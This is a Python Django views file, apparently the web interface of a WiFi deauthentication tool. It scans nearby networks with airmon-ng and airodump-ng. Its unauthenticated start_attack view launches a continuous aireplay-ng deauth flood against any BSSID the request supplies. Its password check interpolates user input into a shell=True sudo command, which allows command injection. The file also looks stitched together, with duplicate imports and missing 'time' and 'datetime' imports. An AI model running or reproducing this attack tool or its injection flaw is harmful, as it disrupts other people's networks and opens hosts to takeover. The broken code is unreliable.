from django.shortcuts import render
from django.http import HttpResponse
import subprocess


def get_wireless_interface():
    try:
        result = subprocess.run(["iwconfig"], capture_output=True, text=True)
        for line in result.stdout.split('\n'):
            if "IEEE 802.11" in line:
                return line.split()[0]
    except Exception as e:
        print(f"Error detecting interface: {e}")
    return None
from django.shortcuts import render, redirect
from django.contrib.auth.decorators import login_required
from django.contrib import messages
import subprocess
import os


@login_required
def scan_networks(request):
    """View for scanning nearby WiFi networks"""
    interface = get_wireless_interface()
    
    if request.method == 'POST':
        password = request.POST.get('password')
        timeout = int(request.POST.get('timeout', 30))
        
        if not interface:
            messages.error(request, "No wireless interface found!")
            return render(request, 'scan.html')
            
        try:
            # Put interface in monitor mode
            cmd = ['sudo', '-S', 'airmon-ng', 'start', interface]
            subprocess.run(
                cmd,
                input=f"{password}\n",
                capture_output=True,
                text=True,
                encoding='utf-8'
            )
            
            # Run airodump-ng scan
            scan_file = f"/tmp/scan_{request.user.id}_{int(time.time())}"
            cmd = [
                'sudo', '-S', 'timeout', str(timeout),
                'airodump-ng', f"{interface}mon", 
                '-w', scan_file, '--output-format', 'csv'
            ]
            
            process = subprocess.Popen(
                cmd,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            process.communicate(input=f"{password}\n")
            
            # Parse results
            csv_file = f"{scan_file}-01.csv"
            if os.path.exists(csv_file):
                with open(csv_file, 'r') as f:
                    networks = []
                    for line in f.readlines()[1:]:
                        if line.strip() == '':
                            continue
                        parts = [p.strip() for p in line.split(',')]
                        networks.append({
                            'bssid': parts[0],
                            'essid': parts[13],
                            'channel': parts[3],
                            'signal': parts[8],
                            'encryption': parts[5]
                        })
                os.remove(csv_file)
                messages.success(request, f"Found {len(networks)} networks")
                return render(request, 'scan.html', {'networks': networks})
            else:
                messages.error(request, "Scan failed - no results file generated")
                
        except Exception as e:
            messages.error(request, f"Error: {str(e)}")
    
    return render(request, 'scan.html', {'interface': interface})



@login_required
def home(request):
    """Dashboard view showing basic system info"""
    interface = get_wireless_interface()
    context = {
        'interface': interface,
        'current_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    return render(request, 'home.html', context)


def start_attack(request):
    if request.method == 'POST':
        target = request.POST.get('bssid')
        interface = request.POST.get('interface')
        filename = request.POST.get('filename')
        channel = request.POST.get('channel')
        
        # Start attack in background
        subprocess.Popen([
            "sudo", "aireplay-ng", "--deauth", "0", 
            "-a", target, f"{interface}mon"
        ])
        return HttpResponse("Attack started!")
    return render(request, 'attack.html')




from django.contrib.auth import authenticate
from django.conf import settings
import os

def verify_password(request):
    if request.method == 'POST':
        password = request.POST.get('password')
        
        # Verify password by testing sudo
        try:
            test_file = f"/tmp/sudo_test_{request.user.id}"
            cmd = f"echo '{password}' | sudo -S touch {test_file}"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                os.remove(test_file)
                request.session['sudo_verified'] = True
                return HttpResponse("✓ Authentication successful")
            else:
                return HttpResponse("✗ Invalid password", status=400)
                
        except Exception as e:
            return HttpResponse(f"Error: {str(e)}", status=500)
    
    return HttpResponse("Invalid request", status=400)

@login_required
def view_logs(request):
    """View for displaying attack logs"""
    log_file = "/var/log/rb-deauther.log"
    logs = []
    
    if os.path.exists(log_file):
        with open(log_file, 'r') as f:
            logs = f.readlines()[-100:]  # Get last 100 lines
    
    return render(request, 'logs.html', {'logs': reversed(logs)})

@login_required
def profile(request):
    """User profile view"""
    return render(request, 'profile.html')